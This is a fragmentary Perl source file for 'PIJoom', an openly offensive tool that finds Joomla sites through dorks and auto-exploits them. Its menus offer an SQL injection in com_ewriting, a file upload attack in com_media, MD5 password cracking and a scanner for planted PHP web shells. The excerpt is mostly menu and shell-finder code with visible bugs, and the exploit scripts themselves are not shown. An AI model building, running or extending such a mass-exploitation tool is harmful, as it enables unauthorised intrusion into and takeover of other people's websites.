...
system('cls' || 'clear');
    system('title PIJoom - Joomla Exploitation Tool');
...
| $$        | $$  | $$  | $$| $$  | $$| $$  | $$| $$ | $$ | $$
| $$       /$$$$$$|  $$$$$$/|  $$$$$$/|  $$$$$$/| $$ | $$ | $$
|__/      |______/ \______/  \______/  \______/ |__/ |__/ |__/ V: 1.0.0
 Joomla Password Injection Auto-Exploiter + Mass Site Finder
 Coded By Ghosty!                     
 
};
print "[>  PIJoom Menu  <]\n";
print "[1]. Dork/Site Search + Auto-Exploit\n";
print "[2]. Joomla(MD5) Password Cracker / Dictionary Attack\n";
print "[3]. PHP Shell Finder\n";
print "[99]. See Previous Cracked Password(s)\n";
print "\n";
print "[>  Misc / Useful  <] \n";
print "[ab]. About PIJoom\n";
print "\n";
print "/ PIJoom Menu /> ";
chop($menu = <stdin>);
if($menu eq '99'){
...
if($menu eq '2'){
system("cd core && perl core_cracker.pl")
}
if($menu eq '3'){
shellfinder();
}
...
sub about{
print "+=> About <=+\n";
print "PIJoom was made by Ghosty, for auto Joomla exploitation.\n";
print "This tool was not made for illegal purposes, using it on secret services or military services\n";
print "is illegal and i'm not respondable for it! Use this tool at your own risk.\n";
print "\n";
exit(0);
}
...
print q{
     ...
     \______ \   ___________|  | __    .__     \_   _____/__  _________ |  |   ____ |__|/  |_ 
      |    |  \ /  _ \_  __ \  |/ /  __|  |___  |    __)_\  \/  /\____ \|  |  /  _ \|  \   __\
      |    `   (  <_> )  | \/    <  /__    __/  |        \>    < |  |_> >  |_(  <_> )  ||  |  
     /_______  /\____/|__|  |__|_ \    |__|    /_______  /__/\_ \|   __/|____/\____/|__||__|  
             \/                  \/                    \/      \/|__|   
                              PIJoom: Search Sites + Exploit 
};
print "\n\n";
print "[> Exploit Menu <]\n";
print "[1]. com_ewriting : Exploit SQL Vulnerability Into EWriting Plugin.\n";
print "[2]. com_media : Exploit File Upload In Media Plugin. \n";
print " \n";
print " / PIJoom Exploit Menu /> ";
chop($exMenu = <stdin>);
if($exMenu eq '1'){
system("cd core && perl core_dork.pl");
}
if($exMenu eq '2'){
system("cd core && perl core_dork_2.pl");
}
if( not defined $exMenu || $exMenu eq '' || $exMenu != '1' || $exMenu != '2'){
...
use LWP::UserAgent;
print"\n";
print "Please input your target domain?: ";
$site=<STDIN>;
chomp $site;
...
print "Shell Found : $url --> Saved At ShellFound.txt\n";
$filename = 'ShellFound.txt';
	  open(FILE,">>$filename");
      print FILE "Shell: $url\n";
      close(FILE);
}else{

print "Shell Not Found : $myshell\n";

}
}
print "Printing Result file...\n";
$filename = 'ShelLFound.txt';
while (my $filename = <FH> or die "Couldn't open file!") {
    print ("$file");
}
}